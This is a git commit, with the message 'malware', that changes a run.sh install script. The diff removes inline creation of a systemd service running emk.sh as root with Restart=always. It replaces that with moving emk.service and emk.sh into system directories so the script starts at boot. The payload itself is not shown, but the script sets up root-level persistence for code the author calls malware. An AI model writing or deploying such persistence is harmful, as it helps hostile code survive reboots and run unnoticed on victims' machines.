be011e8301dc7be0a386203237026ad39df7796a
enes2 <ekaya2110@posta.pau.edu.tr>
2023-12-26 00:34:02 +0300

    malware

--- run.sh
+++ run.sh
@@ -1,20 +1,5 @@
 #!/bin/bash
 
-touch /etc/systemd/system/emk.service
+mv emk.service /etc/systemd/system/
 
-echo '#!/bin/bash
-    [Unit]
-        After=network.target
-        
-        [Service]
-Type=simple
-User=root
-Restart=always
-ExecStart=/usr/bin/sh emk.sh
-ExecStop=/bin/kill  ${MAINPID}
-
-    [Install]
-WantedBy=multi-user.target
-Alias=emk.service' >> "/etc/systemd/system/emk.service"
-
-cd 
+mv emk.sh /usr/bin/
